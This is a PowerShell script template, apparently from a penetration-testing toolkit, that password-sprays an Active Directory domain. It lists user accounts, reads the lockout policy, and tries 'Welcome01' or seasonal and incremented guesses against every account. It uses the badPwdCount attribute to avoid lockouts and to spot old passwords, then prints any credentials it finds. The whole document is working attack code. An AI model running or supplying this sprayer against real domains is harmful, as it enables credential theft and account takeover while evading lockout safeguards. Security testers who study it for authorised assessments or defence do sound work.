# Rename: Invoke-BadPwdCountScanner.ps1

#region AD functions

<#
.Synopsis
   Returns all useraccounts with a badpwdcount lower than the given value in the domain of the bindDN.
.EXAMPLE
   Get-UserAccounts -bindDN 'LDAP://<DN>' -maxBadPwdCount 5
#>
function Get-UserAccounts ([string]$bindDN, [int]$maxBadPwdCount) {
    
    $userAccounts = @()
    
    # Bind to a global catalog, search all useraccounts throughout the forest and extract all userPrincipalnames 
    $dirEntry    = New-Object System.DirectoryServices.DirectoryEntry($bindDN)
    $dirSearcher = New-Object System.DirectoryServices.DirectorySearcher ($dirEntry) 
    $dirSearcher.Filter = "(&(objectClass=user)(&(sAMAccountName=*)(!sAMAccountName=*$))(badPwdCount<=$maxBadPwdCount))"
    $dirSearcher.SizeLimit = __pagesize__
    [void]$dirSearcher.PropertiesToLoad.Add('sAMAccountName')
    $sResult = $dirSearcher.FindAll()

    # Extract results
    if (-not $sResult) {
        Write-Error 'Could not retrieve useraccounts from AD. Check credentials and\or LDAP settings.'
        return
    }

    foreach ($acc in $sResult) {
        $userAccounts += $acc.Properties['sAMAccountName'][0].ToString()        
    }
    
    # cleanup
    $dirEntry.Dispose()
    $dirSearcher.Dispose()

    return $userAccounts     
}

<#
.Synopsis
   Performs an LDAP query to retrieve attribute of given useraccount
.EXAMPLE
   Get-ADUserAttribute -username <userPrincipalName> -attrname <attributeName> -bindDN <bindDN>
#>
function Get-ADUserAttribute ([string]$username, [string]$attrName, [string]$bindDN) {
   
    $dirEntry    = New-Object System.DirectoryServices.DirectoryEntry($bindDN)
    $dirSearcher = New-Object System.DirectoryServices.DirectorySearcher ($dirEntry) 
    $dirSearcher.Filter = "(&(sAMAccountName=$username))"

    [void]$dirSearcher.PropertiesToLoad.Add($attrName)
    $sResult = $dirSearcher.FindOne()

    # Extract results
    if (-not $sResult) {
        Write-Error 'Could not retrieve useraccount from AD. Check credentials and\or LDAP settings.'
        return
    }
  
    try {
        $value = $sResult.Properties[$attrName][0].ToString()
    } 

    catch {
        Write-Error 'Cannot find specified attribute'
        return
    } 

    finally {
        # cleanup
        $dirEntry.Dispose()
        $dirSearcher.Dispose()
    }

    return $value
}

<#
.Synopsis
   Retrieves ldap reference to PDCe of the domain of the running context (SYSTEM or user account)
.EXAMPLE
   Get-LdapDN
#>
function Get-LdapDN {

    # Connect to AD, find domaincontroller with the PDC FSMO role
    $dirEntry    = New-Object System.DirectoryServices.DirectoryEntry ''
    $dirSearcher = New-object System.DirectoryServices.DirectorySearcher $dirEntry
    $dirSearcher.Filter = '(&(objectClass=domainDNS)(fSMORoleOwner=*))'
    [void]$dirSearcher.PropertiesToLoad.Add('fSMORoleOwner')

    $sResult = $dirSearcher.FindOne()
    $result  = [string]::Empty
    if ($sResult) {
        $roleOwner       = $sResult.Properties['fSMORoleOwner'][0].ToString()
        $RoleOwnerParent = (New-Object System.DirectoryServices.DirectoryEntry "LDAP://$roleOwner").Parent
        $pDCFQDN         = (New-Object System.DirectoryServices.DirectoryEntry "$RoleOwnerParent").dnsHostName        
    } else {
        Write-Error 'Failed to retrieve primary domain controller. Please check script\computer settings'
        return
    }    

    $result = "LDAP://$pDCFQDN/$($dirEntry.distinguishedName)"

    # cleanup
    if (-not $dirSearcher.Disposed) {
        $dirSearcher.Dispose()
    }

    if (-not $dirEntry.Disposed) {
        $dirEntry.Dispose()
    }

    return $result
}

<#
.Synopsis
   Tests if username and password are correct
.EXAMPLE
   Test-Credential -username <samaccountname> -password <password>
#>
function Test-Credential ([string]$username, [string]$password) {

    $result = $false
    try {
        $principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext( 
                [System.DirectoryServices.AccountManagement.ContextType]::Domain)

        $contextOptions = [System.DirectoryServices.AccountManagement.ContextOptions]::Negotiate
        $result = $principalContext.ValidateCredentials($username, $password, $contextOptions) 

        $principalContext.Dispose()
    }

    catch {
    }

    return $result
}

<#
.Synopsis
   Retrieves domainwide password policy of the domain of the running context (SYSTEM or user account)
.EXAMPLE
   Get-DomainPasswordPolicy
#>
function Get-DomainPasswordPolicy {
    
    $dirEntry    = New-Object system.directoryservices.directoryEntry ''
    $dirSearcher = New-Object System.DirectoryServices.DirectorySearcher $dirEntry 
    [void]$dirSearcher.PropertiesToLoad.Add('*')    
    $result = $dirSearcher.Findone()

    $pwdPolicy = New-Object PSObject -Property @{                
                'Minimum length'          = Get-LDAPProperty -sResult $result -propertyName 'minpwdlength'                
                'Lockout threshold'       = Get-LDAPProperty -sResult $result -propertyName 'lockoutthreshold'         
                'Password history length' = Get-LDAPProperty -sResult $result -propertyName 'pwdHistoryLength'
                'Complexity'              = (Get-LDAPProperty -sResult $result -propertyName 'pwdProperties') -as [pwd.properties]                
                'Observation window'      = Get-DaysFromTicks -ticks (Get-LDAPProperty -sResult $result -propertyName 'lockoutobservationwindow')
                'Max password age'        = Get-DaysFromTicks -ticks (Get-LDAPProperty -sResult $result -propertyName 'maxpwdage')                
                'Min password age'        = Get-DaysFromTicks -ticks (Get-LDAPProperty -sResult $r -propertyName 'minpwdage')                      
    }

    # Cleanup
    $dirEntry.dispose()
    $dirSearcher.Dispose()
    
    return $pwdPolicy 
}

<#
.Synopsis
   Enum for pwdproperty value
   https://technet.microsoft.com/nl-nl/library/ms679431(v=vs.85).aspx
#>
$enum = @"
namespace pwd {

    public enum properties {
        DOMAIN_PASSWORD_COMPLEX = 1, 
        DOMAIN_PASSWORD_NO_ANON_CHANGE = 2,
        DOMAIN_PASSWORD_NO_CLEAR_CHANGE = 4,
        DOMAIN_LOCKOUT_ADMINS = 8,
        DOMAIN_PASSWORD_STORE_CLEARTEXT = 16,
        DOMAIN_REFUSE_PASSWORD_CHANGE = 32
    }
}
"@
Add-Type -TypeDefinition $enum -ErrorAction SilentlyContinue

<#
.Synopsis
   Returns value of an attribute of a SearchResult object
.EXAMPLE
   Get-LDAPProperty -sResult <SearchResult> -propertyName <propertyname> -index <0 (default)>
#>
function Get-LDAPProperty($sResult, $propertyName, $index = 0) {
    $rValue = ''

    try {
        $rValue = $sResult.Properties[$propertyName][$index]
    }
    catch {
    }

    return $rValue
}

<#
.Synopsis
   Returns a human readable number based on ticks.
.EXAMPLE
   Get-DaysFromTicks -ticks <ticks>
#>
function Get-DaysFromTicks([int64]$ticks){

    if ($ticks -eq [int64]::MinValue) {
        return 0
    }

    $days = 0
    $_ticks = $ticks
    if ($ticks -lt 0) {
        $_ticks = [Math]::abs($ticks)
    }
    $ts = [System.TimeSpan]::FromTicks($ticks) 
    return $ts.Days
}

#endregion

#region Password functions

<#
.Synopsis
   Returns season number based on current month
.EXAMPLE
   Get-CurrentSeasonNumber
#>
function Get-CurrentSeasonNumber {

    $season = 0
    $now            = [datetime]::Now
    [float]$value = $now.Month + $now.day / 100

    if ($value -lt 3.21 -or $value -ge 12.22) {
        $season = 1
    } elseif ($value -lt 6.21) {
        $season = 2
    } elseif ($value -lt 9.23) {
        $season = 3
    } else{
        $season = 4
    }

    return $season
}

<#
.Synopsis
   Returns the name of the season based on the number. 
.EXAMPLE
   Get-SeasonFromNumber -seasonNumber 2 
#>
function Get-SeasonFromNumber ($seasonNumber) {

    [string]$season = [string]::Empty

    if ($seasonNumber -eq 1) {
        $season = 'Winter'
    } elseif ($seasonNumber -eq 2) {
        $season = 'Spring'
    } elseif ($seasonNumber -eq 3) {
        $season = 'Summer'
    } else{
        $season = 'Autumn'
    }

    return $season
}

<#
.Synopsis
   Returns the number of the season based on the name of the season
.EXAMPLE
   Get-NumberFromSeason -season Winter
#>
function Get-NumberFromSeason ($season) {

    $seasonNumber = 0
    $_season = $season.ToLower()

    if ($_season -eq 'winter') {
        $seasonNumber = 1
    } elseif ($_season -eq 'spring') {
        $seasonNumber = 2
    } elseif ($_season -eq 'summer') {
        $seasonNumber = 3
    } elseif ($_season -eq 'autumn') {
        $seasonNumber = 4
    }
    
    return $seasonNumber
}

<#
.Synopsis
   Increments passwords like winter2017, welcome01, etc
.DESCRIPTION
   If the prefix is a season, the season is incremented into the next season.
   Let's say that the password is Summer2017 then the incremented password will be Autumn2017.

   If the prefix is Welcome01 or anything like that, the returned value will be Welcome02.   
.EXAMPLE
   Increment-Password -suffix 01 -prefix welcome
#>
function Increment-Password ([int]$suffix, $prefix) {
    
    $newPassword = @()

    $seasonRegex = '^winter|spring|summer|autumn'
    if ($prefix -match $seasonRegex) {
        $seasonNumber = Get-NumberFromSeason $prefix

        # if it's 4, make it 1 (Herfst). Since winter starts at 21-12, we need to increment the year as well
        if ($seasonNumber -eq 4) {
            $suffix++
            $seasonNumber = 1
        } else {
            $seasonNumber++
        }

        $season = Get-SeasonFromNumber -seasonNumber $seasonNumber
        $newPassword = @($season,$suffix)
    } else {
        $nSuffix = $($suffix++;$suffix)
        if ($nSuffix -lt 10) {
            $nSuffix = "0$nSuffix"
        }
        #$newPassword = @($prefix,$($suffix++;$suffix))
        $newPassword = @($prefix,$nSuffix)
    }

    return $newPassword
}

<#
.Synopsis
   Returns a multidimensional array with passwords. The multidimensional array contains two arrays of prefixes and suffixes of 
   passwords.
.EXAMPLE
   Get-Passwords
#>
function Get-Passwords {

    # Generate list with password    
    $passwordData = '__pwdData__'
    $passwordsPrefix = @()
    $passwordsSuffix = @()
    
    $_passwords = $passwordData -split ','
    foreach ($p in $_passwords) {
        $splits = $p.split('|')
        $passwordsPrefix += $splits[0]
        $passwordsSuffix += $splits[1]
    }

    $passwords = @($passwordsPrefix), @($passwordsSuffix)
    return $passwords
}


#endregion


function Start-Check ($password = 'Welcome01', [switch]$Bruteforce = $false) {

    # Some sanity checks
    if ([string]::IsNullOrEmpty($password)) {
           $password = 'Welcome01'
    }

    # Specify domainController with PDC role in $ldapDN to avoid replication issues
    $ldapDN = Get-LdapDN

    if (-not $ldapDN) {
        return    
    }

    # Get current passwordpolicy
    $pwdPolicy = Get-DomainPasswordPolicy
    
    # Get all useraccounts
    $userAccounts = Get-UserAccounts -bindDN $ldapDN -maxBadPwdCount ($pwdPolicy.'Lockout threshold' -2)

    if (-not $userAccounts) {
        return
    }

    # Iterate through all useraccounts. Test common passwords. If they match it's an instant win.
    # If not, check if badpwdcount has been incremented after a login with a false password. If it's not, it's a previous
    # password of the user and we might be able to guess the current one
    $passwordList = Get-Passwords

    foreach ($userAccount in $userAccounts) {
        
        # Get current badPwdCount value for $userAccount. 
        # If it's equal or 1 incrementation away of getting locked out, we skip the account        
        $currBadPwdCount = Get-ADUserAttribute -username $userAccount -attrName 'badPwdCount' -bindDN $ldapDN
        if ($currBadPwdCount -ge $pwdPolicy.'Lockout threshold' -1) {
            #Write-Host "Lockout threshold almost met: $userAccount" -ForegroundColor Yellow
            continue
        }

        if (-not $Bruteforce) {
            $result = Test-Credential -username $userAccount -password $password
            if ($result) {
                Write-Host "[+] $userAccount => $password"
                continue
            } 

            # Check if password has been incremented
            $newBadPwdCount = Get-ADUserAttribute -username $userAccount -attrName 'badPwdCount' -bindDN $ldapDN
            if (-not $newBadPwdCount){
                continue
            }

            if ($currBadPwdCount -eq $newBadPwdCount) {
                Write-Host "[!] $userAccount => $password"
            }
            } else{

                for ($i=0; $i -lt $passwordList[0].Count; $i++){

                    $passPrefix  = $passwordList[0][$i]
                    $passSuffix  = $passwordList[1][$i]        
                    $tstPassword = "{0}{1}" -f $passPrefix, $passSuffix

                    $result = Test-Credential -UserName $userAccount -Password $tstPassword 
                    if ($result) {
                        Write-Host "[+] $userAccount => $tstPassword"
                        break
                    }        

                    # Invalid credentials. Check if badPwdCount has been incremented. If not, increment password and check again
                    $newBadPwdCount = Get-ADUserAttribute -username $userAccount -attrName 'badPwdCount' -bindDN $ldapDN        

                    if ($newBadPwdCount -eq $currBadPwdCount) {                       
                                            
                        # We're on the right track, so we can guess the password for a maximum of two times
                        for ($j=0; $j -lt 2; $j++) {           

                            # Increment password.
                            $incrementedPasswordStuff = Increment-Password -suffix $passSuffix -prefix $passPrefix
                            $passPrefix = $incrementedPasswordStuff[0]
                            $passSuffix = $incrementedPasswordStuff[1]
                            $incrementedPassword = "{0}{1}" -f $passPrefix, $passSuffix

                            # Test incremented password
                            $result = Test-Credential -UserName $userAccount -Password $incrementedPassword 

                            if ($result) {
                                Write-Host "[*] $userAccount => $incrementedPassword"                                
                                break
                            } elseif ($j -eq 0){
                                Write-Host "[!] $userAccount => $password"
                            } else{
                                Write-Host "[!] $userAccount => $incrementedPassword"
                            }

                            # Too bad. Check if the counter has been incremented. If not, let's try it again.
                            $currBadPwdCount = $newBadPwdCount
                            $newBadPwdCount  = Get-ADUserAttribute -username $userAccount -attrName 'badPwdCount' -bindDN $ldapDN  

                            if ($currBadPwdCount -ne $newBadPwdCount) {                                                            
                                break
                            }
                        }           
                    }

                    # Update currBadPwdCount to the new incremented value
                    $currBadPwdCount = $newBadPwdCount

                    # Just to be sure, completely clear the $result variable
                    Remove-Variable result -ErrorAction SilentlyContinue
                }
            }
        }
} 

Add-Type -AssemblyName System.DirectoryServices.AccountManagement

Start-Check -password __pass__ -Bruteforce:__bruteforce__